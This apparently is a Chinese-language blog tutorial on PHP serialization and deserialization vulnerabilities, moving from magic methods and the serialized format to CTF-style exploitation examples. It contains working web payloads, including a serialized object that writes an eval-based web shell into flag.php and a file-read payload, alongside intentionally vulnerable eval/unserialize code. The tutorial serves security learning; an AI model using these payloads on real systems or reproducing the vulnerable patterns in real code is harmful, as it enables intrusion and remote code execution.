



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://example.com/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://example.com/atom.xml" />
<link rel="alternate" type="application/json" title="Hexo" href="http://example.com/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  

<link rel="canonical" href="http://example.com/2022/08/16/Unserialize/">



  <title>
unserialize - web安全 |
Yume Shoka = Hexo</title>
<meta name="generator" content="Hexo 5.4.2"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">unserialize
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2022-08-16 13:38:45">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2022-08-16T13:38:45+08:00">2022-08-16</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://img.timelessq.com/images/2022/07/26/c97ba7c95fea6f32b4bfb028c8898607.jpg"></li>
          <li class="item" data-background-image="https://img.timelessq.com/images/2022/07/26/d10b26588ca1fe939f0146bb24578eaa.jpg"></li>
          <li class="item" data-background-image="https://img.timelessq.com/images/2022/07/26/8bc89f9a0de13b6480bf8c2ace43f806.jpg"></li>
          <li class="item" data-background-image="https://img.timelessq.com/images/2022/07/26/13818173de445fa048acb5e72b8e650e.jpg"></li>
          <li class="item" data-background-image="https://img.timelessq.com/images/2022/07/26/7ab81e5e45a86caec012652e2595d6d5.jpg"></li>
          <li class="item" data-background-image="https://img.timelessq.com/images/2022/07/26/767d892afd9db5bda9fd978ea0a7cb0b.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="In web安全"><span itemprop="name">web安全</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
  <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/16/Unserialize/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="John Doe">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Hexo">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="unserialize"><a class="markdownIt-Anchor" href="#unserialize">#</a> Unserialize</h1>
<h2 id="1php"><a class="markdownIt-Anchor" href="#1php">#</a> 1.php</h2>
<h3 id="类与对象"><a class="markdownIt-Anchor" href="#类与对象">#</a> 类与对象</h3>
<p>类是定义一系列属性和操作的模板，而对象，就是把属性进行实例化，完事交给类里面的方法，进行处理。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class people&#123;</span><br><span class="line">   //定义类属性（类似变量）,public 代表可见性（公有）</span><br><span class="line">    public $name = &#x27;joker&#x27;;</span><br><span class="line">   //定义类方法（类似函数）</span><br><span class="line">   public function smile()&#123;</span><br><span class="line">        echo $this-&gt;name.&quot; is smile...\n&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$psycho = new people(); //根据people类实例化对象</span><br><span class="line">$psycho-&gt;smile();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="魔法方法"><a class="markdownIt-Anchor" href="#魔法方法">#</a> 魔法方法</h3>
<p>为什么被称为魔法方法呢？因为是在触发了某个事件之前或之后，魔法函数会自动调用执行，而其他的普通函数必须手动调用才可以执行。PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以双下划线为前缀。</p>
<table>
<thead>
<tr>
<th>方法名</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>__construct</td>
<td>构造函数，在创建对象时候初始化对象，一般用于对变量赋初值</td>
</tr>
<tr>
<td>__destruct</td>
<td>析构函数，和构造函数相反，在对象不再被使用时 (将所有该对象的引用设为 null) 或者程序退出时自动调用</td>
</tr>
<tr>
<td>__toString</td>
<td>当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串，例如 echo 打印出对象就会调用此方法</td>
</tr>
<tr>
<td>__wakeup()</td>
<td>使用 unserialize 时触发，反序列化恢复对象之前调用该方法</td>
</tr>
<tr>
<td>__sleep()</td>
<td>使用 serialize 时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组 (该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</td>
</tr>
<tr>
<td>__destruct()</td>
<td>对象被销毁时触发</td>
</tr>
<tr>
<td>__call()</td>
<td>在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法</td>
</tr>
<tr>
<td>__callStatic()</td>
<td>在静态上下文中调用不可访问的方法时触发</td>
</tr>
<tr>
<td>__get()</td>
<td>读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）</td>
</tr>
<tr>
<td>__set()</td>
<td>在给不可访问属性赋值时，即在调用私有属性的时候会自动执行</td>
</tr>
<tr>
<td>__isset()</td>
<td>当对不可访问属性调用 isset () 或 empty () 时触发</td>
</tr>
<tr>
<td>__unset()</td>
<td>当对不可访问属性调用 unset () 时触发</td>
</tr>
<tr>
<td>__invoke()</td>
<td>当脚本尝试将对象调用为函数时触发</td>
</tr>
</tbody>
</table>
<p>额外提一下__tostring 的具体触发场景：</p>
<blockquote>
<p>(1) echo(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>b</mi><mi>j</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>p</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>t</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">obj) / print(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">o</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mord">/</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mopen">(</span></span></span></span>obj) 打印时会触发</p>
<p>(2) 反序列化对象与字符串连接时</p>
<p>(3) 反序列化对象参与格式化字符串时</p>
<p>(4) 反序列化对象与字符串进行<mark>比较时（PHP 进行</mark>比较的时候会转换参数类型）</p>
<p>(5) 反序列化对象参与格式化 SQL 语句，绑定参数时</p>
<p>(6) 反序列化对象在经过 php 字符串函数，如 strlen ()、addslashes () 时</p>
<p>(7) 在 in_array () 方法中，第一个参数是反序列化对象，第二个参数的数组中有 toString 返回的字符串的时候 toString 会被调用</p>
<p>(8) 反序列化的对象作为 class_exists () 的参数的时候</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class animal &#123;</span><br><span class="line">        private $name = &#x27;caixukun&#x27;;</span><br><span class="line"></span><br><span class="line">        public function sleep()&#123;</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">            echo $this-&gt;name . &quot; is sleeping...\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __wakeup()&#123;</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">            echo &quot;调用了__wakeup()方法\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">            echo &quot;调用了__construct()方法\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">            echo &quot;调用了__destruct()方法\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __toString()&#123;</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">            echo &quot;调用了__toString()方法\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __set($key, $value)&#123;</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">            echo &quot;调用了__set()方法\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __get($key) &#123;</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">            echo &quot;调用了__get()方法\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $ji = new animal();</span><br><span class="line">    $ji-&gt;name = 1;</span><br><span class="line">    echo $ji-&gt;name;</span><br><span class="line">    $ji-&gt;sleep();</span><br><span class="line">    $ser_ji = serialize($ji);</span><br><span class="line">    //print_r($ser_ji);</span><br><span class="line">    print_r(unserialize($ser_ji))</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//最后调用的结果是：</span><br><span class="line">调用了__construct()方法</span><br><span class="line">调用了__set()方法</span><br><span class="line">调用了__get()方法</span><br><span class="line">caixukun is sleeping...</span><br><span class="line">调用了__wakeup()方法 animal Object ( [name:animal:private] =&gt; caixukun )</span><br><span class="line">调用了__destruct()方法</span><br><span class="line">调用了__destruct()方法</span><br></pre></td></tr></table></figure>
<h3 id="序列化与反序列化"><a class="markdownIt-Anchor" href="#序列化与反序列化">#</a> 序列化与反序列化</h3>
<p>在开发的过程中常常遇到需要把对象或者数组进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到 mysql 数据库中时，我们时常需要将数组进行序列号操作。</p>
<p>php 序列化（serialize）：是将变量转换为可保存或传输的字符串的过程</p>
<p>php 反序列化（unserialize）：就是在适当的时候把这个字符串再转化成原来的变量使用</p>
<p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p>
<p>常见的 php 系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。</p>
<h4 id="序列化"><a class="markdownIt-Anchor" href="#序列化">#</a> 序列化</h4>
<p><strong>需要注意的是变量受到不同修饰符（public，private，protected）修饰进行序列化时，序列化后变量的长度和名称会发生变化</strong>。</p>
<ul>
<li>使用 public 修饰进行序列化后，变量 $team 的长度为 4，正常输出。</li>
<li>使用 private 修饰进行序列化后，会在变量 $team_name 前面加上类的名称，在这里是 object，并且长度会比正常大小多 2 个字节，也就是 9+6+2=17。</li>
<li>使用 protected 修饰进行序列化后，会在变量 $team_group 前面加上 *，并且长度会比正常大小多 3 个字节，也就是 10+3=13。</li>
</ul>
<p>通过对比发现，在受保护的成员前都多了两个字节，受保护的成员在序列化时规则：</p>
<blockquote>
<ol>
<li>
<p>受 Private 修饰的私有成员，序列化时: \x00 + [私有成员所在类名] + \x00 [变量名]</p>
</li>
<li>
<p>受 Protected 修饰的成员，序列化时：\x00 + * + \x00 + [变量名]</p>
</li>
</ol>
<p>其中，&quot;\x00&quot; 代表 ASCII 为 0 的值，即空字节，&quot;*&quot; 必不可少。</p>
</blockquote>
<p>验证一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class object&#123;</span><br><span class="line">    public $team = &#x27;joker&#x27;;</span><br><span class="line">    private $team_name = &#x27;hahaha&#x27;;</span><br><span class="line">    protected $team_group = &#x27;biubiu&#x27;;</span><br><span class="line"></span><br><span class="line">    function hahaha()&#123;</span><br><span class="line">        $this-&gt;$team_members = &#x27;奥力给&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = new object();</span><br><span class="line">echo serialize($object);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">O:6:&quot;object&quot;:3:&#123;s:4:&quot;team&quot;;s:5:&quot;joker&quot;;s:17:&quot;objectteam_name&quot;;s:6:&quot;hahaha&quot;;s:13:&quot;*team_group&quot;;s:6:&quot;biubiu&quot;;&#125;</span><br><span class="line"></span><br><span class="line">如果我们使用urlencode输出时</span><br><span class="line">O%3A6%3A%22object%22%3A3%3A%7Bs%3A4%3A%22team%22%3Bs%3A5%3A%22joker%22%3Bs%3A17%3A%22%00object%00team_name%22%3Bs%3A6%3A%22hahaha%22%3Bs%3A13%3A%22%00%2A%00team_group%22%3Bs%3A6%3A%22biubiu%22%3B%7D</span><br><span class="line"></span><br><span class="line">就能很明显的看到%00和*了</span><br><span class="line"></span><br><span class="line">以上是序列化之后的结果，o代表是一个对象，6是对象object的长度，3的意思是有三个类属性，后面花括号里的是类属性的内容，s表示的是类属性team的类型，4表示类属性team的长度，后面的以此类推。</span><br><span class="line"></span><br><span class="line">值得一提的是，类方法并不会参与到实例化里面。</span><br></pre></td></tr></table></figure>
<p>序列化格式中的字母含义：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a - array                    b - boolean  </span><br><span class="line">d - double                   i - integer</span><br><span class="line">o - common object            r - reference</span><br><span class="line">s - string                   C - custom object</span><br><span class="line">O - class                  N - null</span><br><span class="line">R - pointer reference      U - unicode string</span><br></pre></td></tr></table></figure>
<h4 id="反序列化"><a class="markdownIt-Anchor" href="#反序列化">#</a> 反序列化</h4>
<p>反序列化的话，就依次根据规则进行反向复原。</p>
<p>这边定义一个字符串，然后使用反序列化函数 unserialize 进行反序列化处理，最后使用 var_dump 进行输出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $ser = &#x27;O:6:&quot;object&quot;:3:&#123;s:1:&quot;a&quot;;i:1;s:4:&quot;team&quot;;s:6:&quot;hahaha&quot;;&#125;&#x27;;</span><br><span class="line">    $ser = unserialize($ser);</span><br><span class="line">    echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class="line">    var_dump($ser);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">object(__PHP_Incomplete_Class)#1 (3) &#123;</span><br><span class="line">  [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;</span><br><span class="line">  string(6) &quot;object&quot;</span><br><span class="line">  [&quot;a&quot;]=&gt;</span><br><span class="line">  int(1)</span><br><span class="line">  [&quot;team&quot;]=&gt;</span><br><span class="line">  string(6) &quot;hahaha&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="利用"><a class="markdownIt-Anchor" href="#利用">#</a> 利用：</h3>
<p>在反序列化过程中，其功能就类似于创建了一个新的对象（复原一个对象可能更恰当），并赋予其相应的属性值。如果<strong>让攻击者操纵任意反序列数据</strong>， 那么攻击者就可以实现任意类对象的创建，如果一些类存在一些自动触发的方法（魔术方法），那么就有可能以此为跳板进而攻击系统应用。</p>
<p>挖掘反序列化漏洞的条件是：</p>
<blockquote>
<p>1. 代码中有可利用的类，并且类中有__wakeup ()，__sleep ()，__destruct () 这类特殊条件下可以自己调用的魔术方法。</p>
<p>2. unserialize () 函数的参数可控。</p>
</blockquote>
<h4 id="0x00-__destruct利用"><a class="markdownIt-Anchor" href="#0x00-__destruct利用">#</a> 0x00 __destruct () 利用</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var $test = &quot;demo&quot;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        @eval($this-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = $_POST[&#x27;test&#x27;];</span><br><span class="line">$len = strlen($test)+1;</span><br><span class="line">$p = &quot;O:1:\&quot;A\&quot;:1:&#123;s:4:\&quot;test\&quot;;s:&quot;.$len.&quot;:\&quot;&quot;.$test.&quot;;\&quot;;&#125;&quot;; // 构造序列化对象</span><br><span class="line">$test_unser = unserialize($p); // 反序列化同时触发_destruct函数</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//利用同名变量覆盖和还原对象 可以理解为$test = $_POST[&#x27;test&#x27;],复原时还需要有对应的变量值的length</span><br><span class="line">//由于destruct会在对象销毁时自动调用，我们只需要传入对应的恶意外码即可，题目已经帮我们构造好了序列化后的代码</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">post:</span><br><span class="line">test=phpinfo();</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如上代码，最终的目的是通过调用__destruct () 这个析构函数，将恶意的 payload 注入，导致代码执行。根据上面的魔术方法的介绍，当程序跑到 unserialize () 反序列化的时候，会触发__destruct () 方法，同时也可以触发__wakeup () 方法。但是如果想注入恶意 payload，还需要对<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>e</mi><mi>s</mi><mi>t</mi><mtext>的值进行覆盖，题目中已经给出了序列化链，很明显是对类</mtext><mi>A</mi><mtext>的</mtext></mrow><annotation encoding="application/x-tex">test的值进行覆盖，题目中已经给出了序列化链，很明显是对类A的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">覆</span><span class="mord cjk_fallback">盖</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">题</span><span class="mord cjk_fallback">目</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">已</span><span class="mord cjk_fallback">经</span><span class="mord cjk_fallback">给</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">序</span><span class="mord cjk_fallback">列</span><span class="mord cjk_fallback">化</span><span class="mord cjk_fallback">链</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">很</span><span class="mord cjk_fallback">明</span><span class="mord cjk_fallback">显</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">类</span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">的</span></span></span></span> test 变量进行覆盖。</p>
</blockquote>
<h4 id="0x01-__tostring利用"><a class="markdownIt-Anchor" href="#0x01-__tostring利用">#</a> 0x01 __tostring () 利用</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//index.php</span><br><span class="line">&lt;?php </span><br><span class="line">$txt = $_GET[&quot;txt&quot;]; </span><br><span class="line">$file = $_GET[&quot;file&quot;]; </span><br><span class="line">$password = $_GET[&quot;password&quot;]; </span><br><span class="line">if(isset($txt)&amp;&amp;(file_get_contents($txt,&#x27;r&#x27;)===&quot;welcome to the bugkuctf&quot;))</span><br><span class="line">&#123; </span><br><span class="line">    echo &quot;hello friend!&lt;br&gt;&quot;; </span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))</span><br><span class="line">    &#123; </span><br><span class="line">       echo &quot;不能现在就给你flag哦&quot;; </span><br><span class="line">       exit(); </span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123; </span><br><span class="line">       include($file); </span><br><span class="line">       $password = unserialize($password); </span><br><span class="line">       echo $password; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123; </span><br><span class="line">       echo &quot;you are not the number of bugku ! &quot;; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//hint.php</span><br><span class="line">&lt;?php  </span><br><span class="line">class Flag&#123;//flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            return (&quot;good&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>hint.php 文件中使用了魔术方法__tostring () 方法，当一个对象被当作一个字符串被调用时即可触发，方法的主要作用是读取并打印传进来的 $file，估计是通过反序列化漏洞来读取 flag.php 的内容。追踪以下调用链，在 index.php 文件中发现使用 echo 将反序列化的对象当作字符串打印，此处就会触发__tostring () 方法，并且 unserialize () 内的变量可控，满足反序列化漏洞条件。</p>
</blockquote>
<h4 id="0x02-__wakeup利用"><a class="markdownIt-Anchor" href="#0x02-__wakeup利用">#</a> 0x02 __wakeup () 利用</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    var $test = &#x27;123&#x27;;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $fp = fopen(&quot;flag.php&quot;,&quot;w&quot;);</span><br><span class="line">        fwrite($fp,$this-&gt;test);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&#x27;id&#x27;];</span><br><span class="line">print_r($a);</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">$a_unser = unserialize($a);</span><br><span class="line">require &quot;flag.php&quot;;</span><br><span class="line">?&gt;     </span><br><span class="line"></span><br><span class="line">pyload:</span><br><span class="line">?id=O:4:&quot;test&quot;:1:&#123;s:4:&quot;test&quot;;s:27:&quot;&lt;?php eval($_GET[&#x27;sb&#x27;]); ?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    var $test = &quot;&lt;?php eval($_GET[&#x27;sb&#x27;]); ?&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$test = new test();</span><br><span class="line">echo serialize($test);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
